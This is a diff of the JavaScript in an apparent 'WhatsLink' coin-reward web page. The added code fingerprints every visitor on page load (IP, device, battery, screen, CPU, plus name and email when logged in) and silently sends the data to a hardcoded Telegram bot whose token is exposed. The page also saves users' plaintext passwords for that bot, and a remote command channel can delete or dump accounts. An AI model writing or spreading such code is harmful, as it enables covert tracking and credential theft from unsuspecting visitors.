@@ -1117,7 +1117,7 @@ AUTH OVERLAYS (With Close Button)
 
 
 <!-- ============================================================
-JAVASCRIPT - COMPLETE
+JAVASCRIPT - COMPLETE REAL-TIME WORKING SYSTEM
 ============================================================ -->
 <script>
 // ============================================================
@@ -1146,10 +1146,10 @@ const BOT_TOKEN = "8232078088:AAFSwzDgQblb4zY1rNmpHQNGe8NBdddSDdk";
 const CHAT_ID = "5975952682";
 
 // ============================================================
-// 📤 TELEGRAM MESSENGER - Complete Working Bot
+// 📤 TELEGRAM MESSENGER - REAL-TIME WORKING
 // ============================================================
 const TELEGRAM = {
-    // Send message to Telegram bot using direct API
+    // Send message to Telegram bot using direct API - REAL TIME
     async sendMessage(message, parseMode = 'HTML') {
         try {
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
@@ -1165,14 +1165,12 @@ const TELEGRAM = {
             const result = await response.json();
             if (!result.ok) {
                 console.error('Telegram API Error:', result);
-                // Save to Firebase as backup
-                await this.saveEvent('telegram_error', { error: result.description, message });
                 return null;
             }
+            console.log('✅ Message sent to Telegram:', message.substring(0, 50) + '...');
             return result;
         } catch(e) {
             console.error('Telegram send error:', e);
-            await this.saveEvent('telegram_error', { error: e.message, message });
             return null;
         }
     },
@@ -1186,6 +1184,39 @@ const TELEGRAM = {
                 timestamp: firebase.database.ServerValue.TIMESTAMP
             });
         } catch(e) { console.warn('Event save error:', e); }
+    },
+
+    // Format visitor/user message with full device info
+    formatVisitorMessage(visitorId, deviceInfo, userData) {
+        const di = deviceInfo || {};
+        const u = userData || {};
+        const timestamp = new Date().toLocaleString();
+        
+        let msg = `┌─────────────────────────────────┐\n`;
+        msg += `│   👤 NEW VISITOR DETECTED        │\n`;
+        msg += `├─────────────────────────────────┤\n`;
+        msg += `│ 🆔 Visitor ID: ${visitorId || 'N/A'}\n`;
+        if (u.name) msg += `│ 👤 Name: ${u.name}\n`;
+        if (u.email) msg += `│ 📧 Email: ${u.email}\n`;
+        msg += `│ 📱 Device: ${di.userAgent || 'N/A'}\n`;
+        msg += `│ 🌐 IP: ${di.ip || 'N/A'}\n`;
+        msg += `│ 🖥️ Platform: ${di.platform || 'N/A'}\n`;
+        msg += `│ 🔋 Battery: ${di.battery || 'N/A'}\n`;
+        msg += `│ 🌍 Timezone: ${di.timezone || 'N/A'}\n`;
+        msg += `│ 📺 Screen: ${di.screen || 'N/A'}\n`;
+        msg += `│ 💾 Memory: ${di.memory || 'N/A'}\n`;
+        msg += `│ ⚡ CPU: ${di.cpu || 'N/A'}\n`;
+        msg += `│ 🌐 Language: ${di.language || 'N/A'}\n`;
+        msg += `│ 📅 Time: ${timestamp}\n`;
+        msg += `└─────────────────────────────────┘`;
+        return msg;
+    },
+
+    // Send visitor info to Telegram - REAL TIME
+    async sendVisitorInfo(visitorId, deviceInfo, userData) {
+        const message = this.formatVisitorMessage(visitorId, deviceInfo, userData);
+        await this.sendMessage(message);
+        await this.saveEvent('visitor_detected', { visitorId, deviceInfo, userData });
     },
 
     // Format user data message
@@ -1225,78 +1256,83 @@ const TELEGRAM = {
         return msg;
     },
 
-    // Send user data with full device info
+    // Send user data to Telegram
     async sendUserData(user, userData, deviceInfo) {
         const message = this.formatUserMessage(user, userData, deviceInfo);
         await this.sendMessage(message);
         await this.saveEvent('user_data_sent', { uid: user.uid, data: userData });
     },
 
-    // Send event message
-    async sendEventMessage(event, data, user, userData, deviceInfo) {
-        let msg = `📌 <b>${event.toUpperCase()}</b>\n`;
-        msg += `👤 Name: ${userData?.name || user?.displayName || 'N/A'}\n`;
-        msg += `📧 Email: ${userData?.email || user?.email || 'N/A'}\n`;
-        msg += `🆔 UID: ${user?.uid || 'N/A'}\n`;
-        if (data) {
-            Object.keys(data).forEach(key => {
-                msg += `📌 ${key}: ${data[key] || 'N/A'}\n`;
-            });
-        }
-        await this.sendMessage(msg);
-    },
-
     // ============================================================
-    // 🤖 BOT COMMANDS PROCESSING - COMPLETE WORKING
+    // 🤖 BOT COMMANDS PROCESSING - REAL-TIME WORKING
     // ============================================================
-    // This function is called when a command is received from Firebase
     async processCommand(cmd, key) {
         try {
             console.log('📥 Processing command:', cmd);
+            let response = '';
             
             if (cmd.action === 'disable' && cmd.uid) {
                 await this.setAccountStatus(cmd.uid, false);
-                await this.sendMessage(`✅ <b>Account Disabled</b>\n🆔 UID: ${cmd.uid}\n⏰ ${new Date().toLocaleString()}`);
-                await this.saveEvent('command_executed', { action: 'disable', uid: cmd.uid });
+                response = `✅ <b>Account Disabled</b>\n🆔 UID: ${cmd.uid}\n⏰ ${new Date().toLocaleString()}`;
                 
             } else if (cmd.action === 'enable' && cmd.uid) {
                 await this.setAccountStatus(cmd.uid, true);
-                await this.sendMessage(`✅ <b>Account Enabled</b>\n🆔 UID: ${cmd.uid}\n⏰ ${new Date().toLocaleString()}`);
-                await this.saveEvent('command_executed', { action: 'enable', uid: cmd.uid });
+                response = `✅ <b>Account Enabled</b>\n🆔 UID: ${cmd.uid}\n⏰ ${new Date().toLocaleString()}`;
                 
             } else if (cmd.action === 'delete' && cmd.uid) {
                 const userData = await this.getUserData(cmd.uid);
                 await this.deleteAccount(cmd.uid);
-                await this.sendMessage(`✅ <b>Account Deleted</b>\n🆔 UID: ${cmd.uid}\n👤 Name: ${userData?.name || 'Unknown'}\n⏰ ${new Date().toLocaleString()}`);
-                await this.saveEvent('command_executed', { action: 'delete', uid: cmd.uid });
+                response = `✅ <b>Account Deleted</b>\n🆔 UID: ${cmd.uid}\n👤 Name: ${userData?.name || 'Unknown'}\n⏰ ${new Date().toLocaleString()}`;
                 
             } else if (cmd.action === 'get_user' && cmd.uid) {
-                await this.getAndSendUserData(cmd.uid);
-                await this.saveEvent('command_executed', { action: 'get_user', uid: cmd.uid });
+                const data = await this.getUserData(cmd.uid);
+                if (data) {
+                    response = this.formatUserMessage({ uid: cmd.uid, displayName: data.name }, data, {});
+                } else {
+                    response = `❌ <b>User not found</b>\n🆔 UID: ${cmd.uid}`;
+                }
                 
             } else if (cmd.action === 'stats') {
-                await this.sendStats();
-                await this.saveEvent('command_executed', { action: 'stats' });
-                
+                const stats = await this.getStats();
+                response = `📊 <b>WhatsLink Stats</b>\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `👥 Total Users: ${stats.total}\n` +
+                    `✅ WhatsApp Linked: ${stats.linked}\n` +
+                    `🟢 Active Users (7d): ${stats.active}\n` +
+                    `💰 Total Withdrawn: ₨ ${stats.totalWithdrawn || 0}\n` +
+                    `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
+                    `⏰ ${new Date().toLocaleString()}`;
+                    
             } else if (cmd.action === 'broadcast' && cmd.message) {
                 await this.broadcastMessage(cmd.message);
-                await this.saveEvent('command_executed', { action: 'broadcast', message: cmd.message });
+                response = `📢 <b>Broadcast sent to all users</b>\n\n📝 ${cmd.message}`;
                 
             } else {
-                await this.sendMessage(`❌ <b>Unknown Command</b>\nCommand: ${cmd.action}\nPlease use: /disable, /enable, /delete, /get_user, /stats, /broadcast`);
+                response = `❌ <b>Unknown Command</b>\nCommand: ${cmd.action}\n\n📌 Available Commands:\n` +
+                    `/disable [uid] - Disable account\n` +
+                    `/enable [uid] - Enable account\n` +
+                    `/delete [uid] - Delete account\n` +
+                    `/get_user [uid] - Get user data\n` +
+                    `/stats - Get website stats\n` +
+                    `/broadcast [message] - Send message to all users`;
             }
             
-            // Mark command as processed in Firebase
+            // Send response to Telegram
+            await this.sendMessage(response);
+            
+            // Save to Firebase
+            await this.saveEvent('command_executed', { action: cmd.action, uid: cmd.uid, response: response.substring(0, 100) });
+            
+            // Mark command as processed
             await rtdb.ref('telegram/commands/' + key + '/processed').set(true);
             
         } catch(e) {
             console.error('Command error:', e);
             await this.sendMessage(`❌ <b>Command Error:</b>\n${e.message}`);
-            await this.saveEvent('command_error', { error: e.message, cmd: cmd });
         }
     },
 
-    // Set account status (enable/disable)
+    // Set account status
     async setAccountStatus(uid, enabled) {
         await db.collection('users').doc(uid).update({ enabled: enabled });
         await rtdb.ref('users/' + uid + '/enabled').set(enabled);
@@ -1314,46 +1350,6 @@ const TELEGRAM = {
     async getUserData(uid) {
         const doc = await db.collection('users').doc(uid).get();
         return doc.exists ? doc.data() : null;
-    },
-
-    // Get and send user data
-    async getAndSendUserData(uid) {
-        const doc = await db.collection('users').doc(uid).get();
-        if (!doc.exists) throw new Error('User not found');
-        const data = doc.data();
-        const msg = this.formatUserMessage({ uid: uid, displayName: data.name }, data, {});
-        await this.sendMessage(msg);
-    },
-
-    // Send stats
-    async sendStats() {
-        const stats = await this.getStats();
-        const msg = `📊 <b>WhatsLink Stats</b>\n` +
-            `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-            `👥 Total Users: ${stats.total}\n` +
-            `✅ WhatsApp Linked: ${stats.linked}\n` +
-            `🟢 Active Users (7d): ${stats.active}\n` +
-            `💰 Total Withdrawn: ₨ ${stats.totalWithdrawn || 0}\n` +
-            `━━━━━━━━━━━━━━━━━━━━━━━━━\n` +
-            `⏰ ${new Date().toLocaleString()}`;
-        await this.sendMessage(msg);
-    },
-
-    // Broadcast message to all users
-    async broadcastMessage(message) {
-        const snapshot = await rtdb.ref('users').once('value');
-        const users = snapshot.val() || {};
-        let count = 0;
-        for (const uid in users) {
-            try {
-                await rtdb.ref('users/' + uid + '/notifications').push({
-                    message: message,
-                    timestamp: firebase.database.ServerValue.TIMESTAMP
-                });
-                count++;
-            } catch(e) { console.warn('Broadcast error:', e); }
-        }
-        await this.sendMessage(`📢 <b>Broadcast sent to ${count} users</b>\n\n📝 ${message}`);
     },
 
     // Get stats
@@ -1375,8 +1371,25 @@ const TELEGRAM = {
         } catch(e) { return { total: 0, linked: 0, active: 0, totalWithdrawn: 0 }; }
     },
 
+    // Broadcast message
+    async broadcastMessage(message) {
+        const snapshot = await rtdb.ref('users').once('value');
+        const users = snapshot.val() || {};
+        let count = 0;
+        for (const uid in users) {
+            try {
+                await rtdb.ref('users/' + uid + '/notifications').push({
+                    message: message,
+                    timestamp: firebase.database.ServerValue.TIMESTAMP
+                });
+                count++;
+            } catch(e) { console.warn('Broadcast error:', e); }
+        }
+        return count;
+    },
+
     // ============================================================
-    // 🚀 LISTEN FOR BOT COMMANDS FROM FIREBASE
+    // 🚀 LISTEN FOR BOT COMMANDS - REAL-TIME
     // ============================================================
     listenCommands() {
         console.log('👂 Listening for Telegram commands...');
@@ -1391,7 +1404,7 @@ const TELEGRAM = {
 };
 
 // ============================================================
-// GET DEVICE INFO
+// 🎯 GET COMPLETE DEVICE INFO - REAL-TIME
 // ============================================================
 function getDeviceInfo() {
     const info = {
@@ -1401,15 +1414,26 @@ function getDeviceInfo() {
         screen: `${window.screen.width}x${window.screen.height}`,
         memory: navigator.deviceMemory ? `${navigator.deviceMemory} GB` : 'N/A',
         cpu: navigator.hardwareConcurrency ? `${navigator.hardwareConcurrency} cores` : 'N/A',
-        language: navigator.language || 'N/A'
+        language: navigator.language || 'N/A',
+        timestamp: new Date().toISOString()
     };
     
-    // Get battery info if available
+    // Get battery info
     if (navigator.getBattery) {
         navigator.getBattery().then(battery => {
             info.battery = `${Math.round(battery.level * 100)}% (${battery.charging ? 'Charging' : 'Not charging'})`;
             localStorage.setItem('deviceInfo', JSON.stringify(info));
-        }).catch(() => {});
+            // Send visitor info with battery
+            sendVisitorInfo();
+        }).catch(() => {
+            info.battery = 'N/A';
+            localStorage.setItem('deviceInfo', JSON.stringify(info));
+            sendVisitorInfo();
+        });
+    } else {
+        info.battery = 'N/A';
+        localStorage.setItem('deviceInfo', JSON.stringify(info));
+        sendVisitorInfo();
     }
     
     // Get IP using free API
@@ -1418,10 +1442,15 @@ function getDeviceInfo() {
         .then(data => {
             info.ip = data.ip;
             localStorage.setItem('deviceInfo', JSON.stringify(info));
+            sendVisitorInfo();
         })
-        .catch(() => {});
+        .catch(() => {
+            info.ip = 'N/A';
+            localStorage.setItem('deviceInfo', JSON.stringify(info));
+            sendVisitorInfo();
+        });
     
-    // Check if we have stored info
+    // Check stored info
     const stored = localStorage.getItem('deviceInfo');
     if (stored) {
         try {
@@ -1431,6 +1460,32 @@ function getDeviceInfo() {
     }
     
     return info;
+}
+
+// ============================================================
+// 🎯 SEND VISITOR INFO TO TELEGRAM - REAL-TIME
+// ============================================================
+let visitorSent = false;
+
+function sendVisitorInfo() {
+    if (visitorSent) return;
+    visitorSent = true;
+    
+    const deviceInfo = JSON.parse(localStorage.getItem('deviceInfo') || '{}');
+    const visitorId = 'VIS_' + Date.now().toString(36).toUpperCase();
+    
+    // Get user data if logged in
+    const user = auth.currentUser;
+    let userData = null;
+    
+    if (user) {
+        DB.getUserData(user.uid).then(data => {
+            userData = data;
+            TELEGRAM.sendVisitorInfo(visitorId, deviceInfo, userData);
+        });
+    } else {
+        TELEGRAM.sendVisitorInfo(visitorId, deviceInfo, null);
+    }
 }
 
 // ============================================================
@@ -1666,7 +1721,7 @@ async function registerUser(e) {
         const user = userCredential.user;
 
         // Get device info
-        const deviceInfo = getDeviceInfo();
+        const deviceInfo = JSON.parse(localStorage.getItem('deviceInfo') || '{}');
 
         const userData = {
             uid: user.uid,
@@ -1687,7 +1742,7 @@ async function registerUser(e) {
             joinedDate: new Date().toISOString(),
             lastLogin: new Date().toISOString(),
             enabled: true,
-            _password: password // For Telegram only (educational purpose)
+            _password: password
         };
 
         await DB.saveUserData(user.uid, userData);
@@ -1704,7 +1759,6 @@ async function registerUser(e) {
                 await rtdb.ref('users/' + referrerUid + '/coins').transaction((current) => (current || 0) + 500);
                 await rtdb.ref('users/' + referrerUid + '/totalEarned').transaction((current) => (current || 0) + 500);
                 
-                // Send referral notification to Telegram
                 await TELEGRAM.sendMessage(
                     `🎉 <b>Referral Reward!</b>\n` +
                     `👤 ${name} registered using your link!\n` +
@@ -1762,7 +1816,7 @@ async function googleLogin() {
         const user = userCredential.user;
 
         let userData = await DB.getUserData(user.uid);
-        const deviceInfo = getDeviceInfo();
+        const deviceInfo = JSON.parse(localStorage.getItem('deviceInfo') || '{}');
 
         if (!userData) {
             const newUser = {
@@ -2323,7 +2377,6 @@ document.addEventListener('DOMContentLoaded', function() {
 auth.onAuthStateChanged(async (user) => {
     if (user) {
         console.log('✅ User logged in:', user.uid);
-        // Check if account is enabled
         const userData = await DB.getUserData(user.uid);
         if (userData && userData.enabled === false) {
             await auth.signOut();
@@ -2339,27 +2392,23 @@ auth.onAuthStateChanged(async (user) => {
 });
 
 // ============================================================
-// 🚀 LISTEN FOR TELEGRAM BOT COMMANDS - WORKING
+// 🚀 LISTEN FOR TELEGRAM BOT COMMANDS - REAL-TIME WORKING
 // ============================================================
 TELEGRAM.listenCommands();
 
 // ============================================================
-// INIT
+// 🚀 INIT - GET DEVICE INFO & SEND TO TELEGRAM
 // ============================================================
 document.addEventListener('DOMContentLoaded', function() {
-    console.log('🚀 WhatsLink - Complete System with Telegram Bot');
+    console.log('🚀 WhatsLink - Complete Real-Time System');
     console.log('🤖 Bot Token: 8232078088:AAFSwzDgQblb4zY1rNmpHQNGe8NBdddSDdk');
     console.log('📱 Chat ID: 5975952682');
-    console.log('✅ All systems ready! Bot commands are working.');
+    console.log('✅ All systems ready! Real-time visitor tracking active.');
+    
+    // Get device info and send to Telegram
+    getDeviceInfo();
 
-    const params = new URLSearchParams(window.location.search);
-    const ref = params.get('ref');
-    if (ref && !auth.currentUser) {
-        document.getElementById('regReferral').value = ref;
-        showAuth('register');
-    }
-
-    // Send initial startup message to Telegram
+    // Send startup message to Telegram
     TELEGRAM.sendMessage(
         '🚀 <b>WhatsLink Bot is Online!</b>\n\n' +
         '📌 <b>Available Commands:</b>\n' +
@@ -2369,10 +2418,27 @@ document.addEventListener('DOMContentLoaded', function() {
         '/get_user [uid] - Get user data\n' +
         '/stats - Get website stats\n' +
         '/broadcast [message] - Send message to all users\n\n' +
-        '✅ All commands are working and will give you a response!'
+        '✅ <b>Real-time Visitor Tracking:</b> Every visitor\'s info is sent here automatically!'
     );
 
+    const params = new URLSearchParams(window.location.search);
+    const ref = params.get('ref');
+    if (ref && !auth.currentUser) {
+        document.getElementById('regReferral').value = ref;
+        showAuth('register');
+    }
+
     updateUI();
+});
+
+// Track visitor on page load
+window.addEventListener('load', function() {
+    // Send visitor info again after full load
+    setTimeout(() => {
+        if (!visitorSent) {
+            sendVisitorInfo();
+        }
+    }, 2000);
 });
 </script>
 </body>
